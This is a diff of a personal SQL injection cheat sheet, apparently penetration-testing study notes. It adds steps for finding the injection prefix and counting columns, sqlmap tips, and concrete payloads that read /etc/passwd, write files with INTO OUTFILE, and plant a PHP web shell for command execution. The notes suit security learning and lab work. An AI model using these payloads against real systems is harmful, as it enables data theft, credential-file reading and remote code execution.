@@ -12,29 +12,29 @@ big payload cheatsheet can be found [here](https://portswigger.net/web-security/
    
    - once an **Internal server error** appears, SQLi confirmed
 
-2. determine the number of columns
+2. determine the prefix  `' | " | ')` before doing anything. the right prefix will return empty result or you can test it with  `a' | a" | a')` ; the right one will return result `a` while the others will return error / different response
+
+3. determine the number of columns
    
    - add `ORDER BY 100` and keep decrementing the number until the error disappears 
    
    - or add `UNION SELECT NULL,NULL,NULL...`  and keep adding until the error disappears( see 1st remark)
 
-3. find a column containing text 
+4. find a column containing text 
    
    - not always all the returned columns are all displayed, thats why to retrieve data we must determine which column are being displayed ( see the 2nd remark)
 
-4. identifying database version
+5. identifying database version
 
-5. determine present databases 
+6. determine present databases 
 
-6. determine tables present in database
+7. determine tables present in database
 
-7. determine columns in table
+8. determine columns in table
 
-8. retrieve data :'D
+9. retrieve data :'D
 
 > steps 4 to 8 can be done using [this pdf](./SQLi_htb.pdf) 
-
-
 
 ## Reading local files
 
@@ -73,10 +73,24 @@ to be able to read local files, the curret user has to have `FILE` privilege.
 payload: 
 
 ```sql
-
+SELECT LOAD_FILE("/etc/passwd")
 ```
 
+4. WRITE A STRING INTO A LOCAL FILE 
 
+payload:
+
+```sql
+SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt' 
+```
+
+5. WRITE A WEB SHELL 
+
+```sql
+SELECT '<?php system($_REQUEST[0]);?>' INTO OUTFILE '/var/wwww/html/shell.php'-- -
+```
+
+and then execute commands from `http://idk:idk?0=command`
 
 ## Tools
 
@@ -93,6 +107,8 @@ ez tool to determine if SQLi is present,
   ```
   
   flags `--risk <nmuber between 1 and 3> --level<nmuber between 1 and 5>` can help if basic command didnt help, `*` marks the parameter to attack specifically, `--prefix` can help if I suspect a userful perfix 
+
+- if one request didnt work, use `--flush-session` to not use cached results
 
 ## Remarks
 
@@ -113,4 +129,6 @@ ez tool to determine if SQLi is present,
 
 4. most commonly in SQLi the DB is gonna be MYSQL, but in case of erros and idk the reason, try other databases, [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) I can find how to determine the DB type and version
 
-5. a payload like `SELECT * FROM logins WHERE (username='username' AND id > 1) AND password = 'password';`here the suffix `)-- -` is crucial for the payload to work. sometimes the payload need prefix or prefix 
+5. a payload like `SELECT * FROM logins WHERE (username='username' AND id > 1) AND password = 'password';`here the suffix `)-- -` is crucial for the payload to work. sometimes the payload need prefix or sufix 
+
+6. **DONT INJECT PASSIVELY**: The injection logic depends on the context. For example, let’s pretend we have an injection in the field `&invitationCode=<input>`. Here, it will be useless to inject `UNION SELECT ...` or `ORDER BY ...` if the application is only checking whether the invitation code is valid. Instead, the relevant logic may be a Boolean condition, so testing something like `OR 1=1` would make more sense in that context.
